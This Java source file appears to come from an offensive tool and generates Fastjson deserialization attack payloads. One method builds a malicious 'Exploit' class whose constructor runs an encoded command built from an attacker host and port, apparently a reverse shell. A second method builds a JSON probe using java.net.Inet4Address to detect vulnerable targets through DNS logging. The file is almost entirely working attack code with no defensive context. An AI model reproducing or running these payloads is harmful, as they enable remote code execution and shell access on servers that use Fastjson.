package com.swordHostDemo.controller;


import com.swordHostDemo.utls.enCodeUtls;

/**
 * @date: 2022/12/28 20:45
 * @description:
 */
public class FastjsonController {


    public static String fastjsonEXP1(String Lhost, String Lport){
        String str = "import java.io.BufferedReader;\n" +
                "import java.io.InputStream;\n" +
                "import java.io.InputStreamReader;\n" +
                "\n" +
                "public class Exploit{\n" +
                "    public Exploit() throws Exception {\n" +
                "        Process p = Runtime.getRuntime().exec(new String[]{\""+ enCodeUtls.JavaEncode(Lhost,Lport)+"\"});\n"+
                "        InputStream is = p.getInputStream();\n" +
                "        BufferedReader reader = new BufferedReader(new InputStreamReader(is));\n" +
                "\n" +
                "        String line;\n" +
                "        while((line = reader.readLine()) != null) {\n" +
                "            System.out.println(line);\n" +
                "        }\n" +
                "\n" +
                "        p.waitFor();\n" +
                "        is.close();\n" +
                "        reader.close();\n" +
                "        p.destroy();\n" +
                "    }\n" +
                "\n" +
                "    public static void main(String[] args) throws Exception {\n" +
                "    }\n" +
                "}";

        return str;
    }

    public static String fastjsonDnslog(String dnslog){
        String str = "{\n" +
                "    \"@type\":\"java.net.Inet4Address\",\n" +
                "    \"val\":\""+dnslog+"\"\n" +
                "}";
        return str;
    }
}
